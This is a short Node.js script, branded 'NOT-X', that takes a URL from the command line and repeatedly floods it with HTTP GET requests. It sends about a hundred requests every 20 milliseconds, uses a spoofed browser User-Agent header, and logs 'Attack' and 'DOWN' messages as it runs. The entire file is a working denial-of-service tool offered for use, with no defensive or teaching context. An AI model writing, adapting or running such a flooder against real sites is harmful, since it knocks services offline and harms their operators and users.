const os = require('os');
const target = process.argv[2];

if (!target) {
    console.log('CODE BY NOT-X');
    console.log('Invalid Usage: node NOT-X.js <URL>');
    process.exit(1);
}
const headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1000000'
};

function attack(target, headers) {
    fetch(target, { headers })
        .then(response => console.log(`⚡️ Attack BY NOT-X ⚡️${target}, STATUS: ${response.status}`))
        .catch(err => console.error(`🛑 DOWN BY NOT-X 🛑 : ${err.message}`));
}

const numCPUs = os.cpus().length;
const targetCPUUsage = 0.1;
const target1CPUUsage = 0.1;
const targetRequestsPerSecond = Math.floor( 100 * targetCPUUsage);
const target1RequestsPerSecond = Math.floor( 100 * target1CPUUsage);

console.log(`🚀 Starting attack By NOT-X 🚀 ${targetRequestsPerSecond}    🟢 requests per second...`);
console.log(`🚀 =======>>NOT-X<<=========🚀 ${target1RequestsPerSecond}    🟢 requests per second...`);

setInterval(() => {
    for (let i = 0; i < targetRequestsPerSecond * target1RequestsPerSecond; i++) {
        attack(target, headers);
    }
}, 20);
